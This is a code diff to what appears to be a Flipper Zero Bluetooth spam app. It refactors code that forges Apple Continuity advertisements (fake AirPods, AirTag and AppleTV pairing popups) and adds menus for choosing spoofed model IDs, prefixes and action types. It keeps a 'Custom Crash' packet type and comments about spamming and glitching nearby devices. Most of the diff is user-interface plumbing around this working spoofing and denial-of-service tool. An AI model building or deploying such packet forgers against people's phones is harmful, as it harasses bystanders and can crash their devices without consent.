@@ -6,6 +6,61 @@
 // Nearby Action IDs and Documentation at https://github.com/furiousMAC/continuity/
 // Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
 
+const struct {
+    uint16_t id;
+    const char* name;
+} pp_models[] = {
+    {0x0E20, "AirPods Pro"},
+    {0x0620, "Beats Solo 3"},
+    {0x0A20, "AirPods Max"},
+    {0x1020, "Beats Flex"},
+    {0x0055, "Airtag"},
+    {0x0030, "Hermes Airtag"},
+    {0x0220, "AirPods"},
+    {0x0F20, "AirPods 2nd Gen"},
+    {0x1320, "AirPods 3rd Gen"},
+    {0x1420, "AirPods Pro 2nd Gen"},
+    {0x0320, "Powerbeats 3"},
+    {0x0B20, "Powerbeats Pro"},
+    {0x0C20, "Beats Solo Pro"},
+    {0x1120, "Beats Studio Buds"},
+    {0x0520, "Beats X"},
+    {0x0920, "Beats Studio 3"},
+    {0x1720, "Beats Studio Pro"},
+    {0x1220, "Beats Fit Pro"},
+    {0x1620, "Beats Studio Buds+"},
+};
+const uint8_t pp_models_count = COUNT_OF(pp_models);
+
+const struct {
+    uint8_t value;
+    const char* name;
+} pp_prefixes[] = {
+    {0x01, "New Device"},
+    {0x07, "Not Your Device"},
+    {0x05, "New Airtag"},
+};
+const uint8_t pp_prefixes_count = COUNT_OF(pp_prefixes);
+
+const struct {
+    uint8_t type;
+    const char* name;
+} na_actions[] = {
+    {0x13, "AppleTV AutoFill"},
+    {0x27, "AppleTV Connecting..."},
+    {0x20, "Join This AppleTV?"},
+    {0x19, "AppleTV Audio Sync"},
+    {0x1E, "AppleTV Color Balance"},
+    {0x09, "Setup New iPhone"},
+    {0x02, "Transfer Phone Number"},
+    {0x0B, "HomePod Setup"},
+    {0x01, "Setup New AppleTV"},
+    {0x06, "Pair AppleTV"},
+    {0x0D, "HomeKit AppleTV Setup"},
+    {0x2B, "AppleID for AppleTV?"},
+};
+const uint8_t na_actions_count = COUNT_OF(na_actions);
+
 static const char* type_names[ContinuityTypeCount] = {
     [ContinuityTypeAirDrop] = "AirDrop",
     [ContinuityTypeProximityPair] = "Proximity Pair",
@@ -16,7 +71,7 @@ static const char* type_names[ContinuityTypeCount] = {
     [ContinuityTypeNearbyInfo] = "Nearby Info",
     [ContinuityTypeCustomCrash] = "Custom Packet",
 };
-const char* continuity_get_name(const ProtocolCfg* _cfg) {
+static const char* continuity_get_name(const ProtocolCfg* _cfg) {
     const ContinuityCfg* cfg = &_cfg->continuity;
     return type_names[cfg->type];
 }
@@ -32,8 +87,7 @@ static uint8_t packet_sizes[ContinuityTypeCount] = {
     [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
     [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
 };
-
-void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg* _cfg) {
+static void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg* _cfg) {
     const ContinuityCfg* cfg = _cfg ? &_cfg->continuity : NULL;
 
     ContinuityType type;
@@ -84,47 +138,26 @@ void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg
     }
 
     case ContinuityTypeProximityPair: {
-        uint16_t model;
-        if(cfg && cfg->data.proximity_pair.model != 0x0000) {
-            model = cfg->data.proximity_pair.model;
+        uint16_t model_id;
+        if(cfg && cfg->data.proximity_pair.model_id != 0x0000) {
+            model_id = cfg->data.proximity_pair.model_id;
         } else {
-            const uint16_t models[] = {
-                0x0E20, // AirPods Pro
-                0x0620, // Beats Solo 3
-                0x0A20, // AirPods Max
-                0x1020, // Beats Flex
-                0x0055, // Airtag
-                0x0030, // Hermes Airtag
-                0x0220, // AirPods
-                0x0F20, // AirPods 2nd Gen
-                0x1320, // AirPods 3rd Gen
-                0x1420, // AirPods Pro 2nd Gen
-                0x0320, // Powerbeats 3
-                0x0B20, // Powerbeats Pro
-                0x0C20, // Beats Solo Pro
-                0x1120, // Beats Studio Buds
-                0x0520, // Beats X
-                0x0920, // Beats Studio 3
-                0x1720, // Beats Studio Pro
-                0x1220, // Beats Fit Pro
-                0x1620, // Beats Studio Buds+
-            };
-            model = models[rand() % COUNT_OF(models)];
+            model_id = pp_models[rand() % pp_models_count].id;
         }
 
         uint8_t prefix;
         if(cfg && cfg->data.proximity_pair.prefix == 0x00) {
             prefix = cfg->data.proximity_pair.prefix;
         } else {
-            if(model == 0x0055 || model == 0x0030)
+            if(model_id == 0x0055 || model_id == 0x0030)
                 prefix = 0x05;
             else
                 prefix = 0x01;
         }
 
         packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
-        packet[i++] = (model >> 0x08) & 0xFF;
-        packet[i++] = (model >> 0x00) & 0xFF;
+        packet[i++] = (model_id >> 0x08) & 0xFF;
+        packet[i++] = (model_id >> 0x00) & 0xFF;
         packet[i++] = 0x55; // Status
         packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
         packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
@@ -179,21 +212,7 @@ void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg
         if(cfg && cfg->data.nearby_action.type != 0x00) {
             action = cfg->data.nearby_action.type;
         } else {
-            const uint8_t actions[] = {
-                0x13, // AppleTV AutoFill
-                0x27, // AppleTV Connecting...
-                0x20, // Join This AppleTV?
-                0x19, // AppleTV Audio Sync
-                0x1E, // AppleTV Color Balance
-                0x09, // Setup New iPhone
-                0x02, // Transfer Phone Number
-                0x0B, // HomePod Setup
-                0x01, // Setup New AppleTV
-                0x06, // Pair AppleTV
-                0x0D, // HomeKit AppleTV Setup
-                0x2B, // AppleID for AppleTV?
-            };
-            action = actions[rand() % COUNT_OF(actions)];
+            action = na_actions[rand() % na_actions_count].type;
         }
 
         uint8_t flag;
@@ -224,22 +243,7 @@ void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg
     case ContinuityTypeCustomCrash: {
         // Found by @ECTO-1A
 
-        const uint8_t actions[] = {
-            0x13, // AppleTV AutoFill
-            0x27, // AppleTV Connecting...
-            0x20, // Join This AppleTV?
-            0x19, // AppleTV Audio Sync
-            0x1E, // AppleTV Color Balance
-            0x09, // Setup New iPhone
-            0x02, // Transfer Phone Number
-            0x0B, // HomePod Setup
-            0x01, // Setup New AppleTV
-            0x06, // Pair AppleTV
-            0x0D, // HomeKit AppleTV Setup
-            0x2B, // AppleID for AppleTV?
-        };
-        uint8_t action = actions[rand() % COUNT_OF(actions)];
-
+        uint8_t action = na_actions[rand() % na_actions_count].type;
         uint8_t flag = 0xC0;
         if(action == 0x20 && rand() % 2) flag--; // More spam for 'Join This AppleTV?'
         if(action == 0x09 && rand() % 2) flag = 0x40; // Glitched 'Setup New Device'
@@ -269,8 +273,497 @@ void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg
     *_packet = packet;
 }
 
+enum {
+    ConfigPpModelId,
+    ConfigPpPrefix,
+};
+enum {
+    ConfigNaActionType,
+    ConfigNaFlags,
+};
+static void config_callback(void* _ctx, uint32_t index) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
+    switch(cfg->type) {
+    case ContinuityTypeProximityPair: {
+        switch(index) {
+        case ConfigPpModelId:
+            scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpModelId);
+            break;
+        case ConfigPpPrefix:
+            scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpPrefix);
+            break;
+        default:
+            break;
+        }
+        break;
+    }
+    case ContinuityTypeNearbyAction: {
+        switch(index) {
+        case ConfigNaActionType:
+            scene_manager_next_scene(ctx->scene_manager, SceneContinuityNaActionType);
+            break;
+        case ConfigNaFlags:
+            scene_manager_next_scene(ctx->scene_manager, SceneContinuityNaFlags);
+            break;
+        default:
+            break;
+        }
+        break;
+    }
+    default:
+        break;
+    }
+}
+static void pp_model_id_changed(VariableItem* item) {
+    ContinuityCfg* cfg = variable_item_get_context(item);
+    uint8_t index = variable_item_get_current_value_index(item);
+    if(index) {
+        index--;
+        cfg->data.proximity_pair.model_id = pp_models[index].id;
+        variable_item_set_current_value_text(item, pp_models[index].name);
+    } else {
+        cfg->data.proximity_pair.model_id = 0x0000;
+        variable_item_set_current_value_text(item, "Random");
+    }
+}
+static void pp_prefix_changed(VariableItem* item) {
+    ContinuityCfg* cfg = variable_item_get_context(item);
+    uint8_t index = variable_item_get_current_value_index(item);
+    if(index) {
+        index--;
+        cfg->data.proximity_pair.prefix = pp_prefixes[index].value;
+        variable_item_set_current_value_text(item, pp_prefixes[index].name);
+    } else {
+        cfg->data.proximity_pair.prefix = 0x00;
+        variable_item_set_current_value_text(item, "Auto");
+    }
+}
+static void na_action_type_changed(VariableItem* item) {
+    ContinuityCfg* cfg = variable_item_get_context(item);
+    uint8_t index = variable_item_get_current_value_index(item);
+    if(index) {
+        index--;
+        cfg->data.nearby_action.type = na_actions[index].type;
+        variable_item_set_current_value_text(item, na_actions[index].name);
+    } else {
+        cfg->data.nearby_action.type = 0x00;
+        variable_item_set_current_value_text(item, "Random");
+    }
+}
+static uint8_t continuity_config_list(Ctx* ctx) {
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    VariableItemList* list = ctx->variable_item_list;
+    uint8_t item_count = 0;
+    VariableItem* item;
+    size_t value_index;
+
+    switch(cfg->type) {
+    case ContinuityTypeProximityPair: {
+        item_count++;
+        item = variable_item_list_add(
+            list, "Model ID", pp_models_count + 1, pp_model_id_changed, cfg);
+        const char* model_name = NULL;
+        char model_name_buf[5];
+        if(cfg->data.proximity_pair.model_id == 0x0000) {
+            model_name = "Random";
+            value_index = 0;
+        } else {
+            for(uint8_t i = 0; i < pp_models_count; i++) {
+                if(cfg->data.proximity_pair.model_id == pp_models[i].id) {
+                    model_name = pp_models[i].name;
+                    value_index = i + 1;
+                    break;
+                }
+            }
+            if(!model_name) {
+                snprintf(
+                    model_name_buf,
+                    sizeof(model_name_buf),
+                    "%04X",
+                    cfg->data.proximity_pair.model_id);
+                model_name = model_name_buf;
+                value_index = pp_models_count + 1;
+            }
+        }
+        variable_item_set_current_value_index(item, value_index);
+        variable_item_set_current_value_text(item, model_name);
+
+        item_count++;
+        item =
+            variable_item_list_add(list, "Prefix", pp_prefixes_count + 1, pp_prefix_changed, cfg);
+        const char* prefix_name = NULL;
+        char prefix_name_buf[3];
+        if(cfg->data.proximity_pair.prefix == 0x00) {
+            prefix_name = "Auto";
+            value_index = 0;
+        } else {
+            for(uint8_t i = 0; i < pp_prefixes_count; i++) {
+                if(cfg->data.proximity_pair.prefix == pp_prefixes[i].value) {
+                    prefix_name = pp_prefixes[i].name;
+                    value_index = i + 1;
+                    break;
+                }
+            }
+            if(!prefix_name) {
+                snprintf(
+                    prefix_name_buf,
+                    sizeof(prefix_name_buf),
+                    "%02X",
+                    cfg->data.proximity_pair.prefix);
+                prefix_name = prefix_name_buf;
+                value_index = pp_prefixes_count + 1;
+            }
+        }
+        variable_item_set_current_value_index(item, value_index);
+        variable_item_set_current_value_text(item, prefix_name);
+        break;
+    }
+    case ContinuityTypeNearbyAction: {
+        item_count++;
+        item = variable_item_list_add(
+            list, "Action Type", na_actions_count + 1, na_action_type_changed, cfg);
+        const char* action_name = NULL;
+        char action_name_buf[3];
+        if(cfg->data.nearby_action.type == 0x00) {
+            action_name = "Random";
+            value_index = 0;
+        } else {
+            for(uint8_t i = 0; i < na_actions_count; i++) {
+                if(cfg->data.nearby_action.type == na_actions[i].type) {
+                    action_name = na_actions[i].name;
+                    value_index = i + 1;
+                    break;
+                }
+            }
+            if(!action_name) {
+                snprintf(
+                    action_name_buf, sizeof(action_name_buf), "%02X", cfg->data.nearby_action.type);
+                action_name = action_name_buf;
+                value_index = na_actions_count + 1;
+            }
+        }
+        variable_item_set_current_value_index(item, value_index);
+        variable_item_set_current_value_text(item, action_name);
+
+        item_count++;
+        item = variable_item_list_add(list, "Flags", 0, NULL, NULL);
+        const char* flags_name = NULL;
+        char flags_name_buf[3];
+        if(cfg->data.nearby_action.flags == 0x00) {
+            flags_name = "Auto";
+        } else {
+            snprintf(
+                flags_name_buf, sizeof(flags_name_buf), "%02X", cfg->data.nearby_action.flags);
+            flags_name = flags_name_buf;
+        }
+        variable_item_set_current_value_text(item, flags_name);
+        break;
+    }
+    default:
+        break;
+    }
+
+    variable_item_list_set_enter_callback(list, config_callback, ctx);
+
+    return item_count;
+}
+
 const Protocol protocol_continuity = {
     .icon = &I_apple,
     .get_name = continuity_get_name,
     .make_packet = continuity_make_packet,
+    .config_list = continuity_config_list,
 };
+
+static void pp_model_id_callback(void* _ctx, uint32_t index) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    switch(index) {
+    case 0:
+        cfg->data.proximity_pair.model_id = 0x0000;
+        scene_manager_previous_scene(ctx->scene_manager);
+        break;
+    case pp_models_count + 1:
+        scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpModelIdCustom);
+        break;
+    default:
+        cfg->data.proximity_pair.model_id = pp_models[index - 1].id;
+        scene_manager_previous_scene(ctx->scene_manager);
+        break;
+    }
+}
+void scene_continuity_pp_model_id_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    Submenu* submenu = ctx->submenu;
+    uint32_t selected = 0;
+    bool found = false;
+    submenu_reset(submenu);
+
+    submenu_add_item(submenu, "Random", 0, pp_model_id_callback, ctx);
+    if(cfg->data.proximity_pair.model_id == 0x0000) {
+        found = true;
+        selected = 0;
+    }
+    for(uint8_t i = 0; i < pp_models_count; i++) {
+        submenu_add_item(submenu, pp_models[i].name, i + 1, pp_model_id_callback, ctx);
+        if(!found && cfg->data.proximity_pair.model_id == pp_models[i].id) {
+            found = true;
+            selected = i + 1;
+        }
+    }
+    submenu_add_item(submenu, "Custom", pp_models_count + 1, pp_model_id_callback, ctx);
+    if(!found) {
+        found = true;
+        selected = pp_models_count + 1;
+    }
+
+    submenu_set_selected_item(submenu, selected);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
+}
+bool scene_continuity_pp_model_id_on_event(void* _ctx, SceneManagerEvent event) {
+    UNUSED(_ctx);
+    UNUSED(event);
+    return false;
+}
+void scene_continuity_pp_model_id_on_exit(void* _ctx) {
+    UNUSED(_ctx);
+}
+
+static void pp_model_id_custom_callback(void* _ctx) {
+    Ctx* ctx = _ctx;
+    scene_manager_previous_scene(ctx->scene_manager);
+    scene_manager_previous_scene(ctx->scene_manager);
+}
+void scene_continuity_pp_model_id_custom_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    ByteInput* byte_input = ctx->byte_input;
+
+    byte_input_set_header_text(byte_input, "Enter custom Model ID");
+
+    ctx->byte_store[0] = (cfg->data.proximity_pair.model_id >> 0x08) & 0xFF;
+    ctx->byte_store[1] = (cfg->data.proximity_pair.model_id >> 0x00) & 0xFF;
+
+    byte_input_set_result_callback(
+        byte_input, pp_model_id_custom_callback, NULL, ctx, (void*)ctx->byte_store, 2);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
+}
+bool scene_continuity_pp_model_id_custom_on_event(void* _ctx, SceneManagerEvent event) {
+    UNUSED(_ctx);
+    UNUSED(event);
+    return false;
+}
+void scene_continuity_pp_model_id_custom_on_exit(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    cfg->data.proximity_pair.model_id =
+        (ctx->byte_store[0] << 0x08) + (ctx->byte_store[1] << 0x00);
+}
+
+static void pp_prefix_callback(void* _ctx, uint32_t index) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    switch(index) {
+    case 0:
+        cfg->data.proximity_pair.prefix = 0x00;
+        scene_manager_previous_scene(ctx->scene_manager);
+        break;
+    case pp_prefixes_count + 1:
+        scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpPrefixCustom);
+        break;
+    default:
+        cfg->data.proximity_pair.prefix = pp_prefixes[index - 1].value;
+        scene_manager_previous_scene(ctx->scene_manager);
+        break;
+    }
+}
+void scene_continuity_pp_prefix_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    Submenu* submenu = ctx->submenu;
+    uint32_t selected = 0;
+    bool found = false;
+    submenu_reset(submenu);
+
+    submenu_add_item(submenu, "Automatic", 0, pp_prefix_callback, ctx);
+    if(cfg->data.proximity_pair.prefix == 0x00) {
+        found = true;
+        selected = 0;
+    }
+    for(uint8_t i = 0; i < pp_prefixes_count; i++) {
+        submenu_add_item(submenu, pp_prefixes[i].name, i + 1, pp_prefix_callback, ctx);
+        if(!found && cfg->data.proximity_pair.prefix == pp_prefixes[i].value) {
+            found = true;
+            selected = i + 1;
+        }
+    }
+    submenu_add_item(submenu, "Custom", pp_prefixes_count + 1, pp_prefix_callback, ctx);
+    if(!found) {
+        found = true;
+        selected = pp_prefixes_count + 1;
+    }
+
+    submenu_set_selected_item(submenu, selected);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
+}
+bool scene_continuity_pp_prefix_on_event(void* _ctx, SceneManagerEvent event) {
+    UNUSED(_ctx);
+    UNUSED(event);
+    return false;
+}
+void scene_continuity_pp_prefix_on_exit(void* _ctx) {
+    UNUSED(_ctx);
+}
+
+static void pp_prefix_custom_callback(void* _ctx) {
+    Ctx* ctx = _ctx;
+    scene_manager_previous_scene(ctx->scene_manager);
+    scene_manager_previous_scene(ctx->scene_manager);
+}
+void scene_continuity_pp_prefix_custom_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    ByteInput* byte_input = ctx->byte_input;
+
+    byte_input_set_header_text(byte_input, "Enter custom Prefix");
+
+    ctx->byte_store[0] = (cfg->data.proximity_pair.prefix >> 0x00) & 0xFF;
+
+    byte_input_set_result_callback(
+        byte_input, pp_prefix_custom_callback, NULL, ctx, (void*)ctx->byte_store, 1);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
+}
+bool scene_continuity_pp_prefix_custom_on_event(void* _ctx, SceneManagerEvent event) {
+    UNUSED(_ctx);
+    UNUSED(event);
+    return false;
+}
+void scene_continuity_pp_prefix_custom_on_exit(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    cfg->data.proximity_pair.prefix = (ctx->byte_store[0] << 0x00);
+}
+
+static void na_action_type_callback(void* _ctx, uint32_t index) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    switch(index) {
+    case 0:
+        cfg->data.nearby_action.type = 0x00;
+        scene_manager_previous_scene(ctx->scene_manager);
+        break;
+    case na_actions_count + 1:
+        scene_manager_next_scene(ctx->scene_manager, SceneContinuityNaActionTypeCustom);
+        break;
+    default:
+        cfg->data.nearby_action.type = na_actions[index - 1].type;
+        scene_manager_previous_scene(ctx->scene_manager);
+        break;
+    }
+}
+void scene_continuity_na_action_type_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    Submenu* submenu = ctx->submenu;
+    uint32_t selected = 0;
+    bool found = false;
+    submenu_reset(submenu);
+
+    submenu_add_item(submenu, "Random", 0, na_action_type_callback, ctx);
+    if(cfg->data.nearby_action.type == 0x00) {
+        found = true;
+        selected = 0;
+    }
+    for(uint8_t i = 0; i < na_actions_count; i++) {
+        submenu_add_item(submenu, na_actions[i].name, i + 1, na_action_type_callback, ctx);
+        if(!found && cfg->data.nearby_action.type == na_actions[i].type) {
+            found = true;
+            selected = i + 1;
+        }
+    }
+    submenu_add_item(submenu, "Custom", na_actions_count + 1, na_action_type_callback, ctx);
+    if(!found) {
+        found = true;
+        selected = na_actions_count + 1;
+    }
+
+    submenu_set_selected_item(submenu, selected);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
+}
+bool scene_continuity_na_action_type_on_event(void* _ctx, SceneManagerEvent event) {
+    UNUSED(_ctx);
+    UNUSED(event);
+    return false;
+}
+void scene_continuity_na_action_type_on_exit(void* _ctx) {
+    UNUSED(_ctx);
+}
+
+static void na_action_type_custom_callback(void* _ctx) {
+    Ctx* ctx = _ctx;
+    scene_manager_previous_scene(ctx->scene_manager);
+    scene_manager_previous_scene(ctx->scene_manager);
+}
+void scene_continuity_na_action_type_custom_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    ByteInput* byte_input = ctx->byte_input;
+
+    byte_input_set_header_text(byte_input, "Enter custom Action Type");
+
+    ctx->byte_store[0] = (cfg->data.nearby_action.type >> 0x00) & 0xFF;
+
+    byte_input_set_result_callback(
+        byte_input, na_action_type_custom_callback, NULL, ctx, (void*)ctx->byte_store, 1);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
+}
+bool scene_continuity_na_action_type_custom_on_event(void* _ctx, SceneManagerEvent event) {
+    UNUSED(_ctx);
+    UNUSED(event);
+    return false;
+}
+void scene_continuity_na_action_type_custom_on_exit(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    cfg->data.nearby_action.type = (ctx->byte_store[0] << 0x00);
+}
+
+static void na_flags_callback(void* _ctx) {
+    Ctx* ctx = _ctx;
+    scene_manager_previous_scene(ctx->scene_manager);
+}
+void scene_continuity_na_flags_on_enter(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    ByteInput* byte_input = ctx->byte_input;
+
+    byte_input_set_header_text(byte_input, "Press back for automatic");
+
+    ctx->byte_store[0] = (cfg->data.nearby_action.flags >> 0x00) & 0xFF;
+
+    byte_input_set_result_callback(
+        byte_input, na_flags_callback, NULL, ctx, (void*)ctx->byte_store, 1);
+
+    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
+}
+bool scene_continuity_na_flags_on_event(void* _ctx, SceneManagerEvent event) {
+    Ctx* ctx = _ctx;
+    if(event.type == SceneManagerEventTypeBack) {
+        ctx->byte_store[0] = 0x00;
+    }
+    return false;
+}
+void scene_continuity_na_flags_on_exit(void* _ctx) {
+    Ctx* ctx = _ctx;
+    ContinuityCfg* cfg = &ctx->attack->payload.cfg.continuity;
+    cfg->data.nearby_action.flags = (ctx->byte_store[0] << 0x00);
+}
